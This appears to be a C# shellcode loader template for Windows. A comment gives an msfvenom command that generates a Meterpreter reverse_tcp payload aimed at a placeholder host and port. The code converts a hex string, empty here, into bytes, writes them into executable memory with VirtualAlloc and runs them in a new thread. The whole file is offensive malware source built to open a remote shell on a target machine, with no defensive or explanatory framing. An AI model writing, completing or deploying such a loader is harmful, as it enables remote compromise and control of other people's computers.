using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            /*
             * msfvenom --arch x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=HOST lport=PORT -f c > payload.txt 
             */

            string payload = "";

            string[] Xpayload = payload.Split(',');
            byte[] X_Final = new byte[Xpayload.Length];
            for(int i = 0; i < Xpayload.Length; i++)
            {
                X_Final[i] = Convert.ToByte(Xpayload[i], 16);
            }

            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Meterpreter session ...");
            UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)X_Final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(X_Final, 0x0000, (IntPtr)(funcAddr), X_Final.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0x0000;
            IntPtr pinfo = IntPtr.Zero;

            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);
            WaitForSingleObject(hThread, 0xffffffff);
        }
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr pram, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}
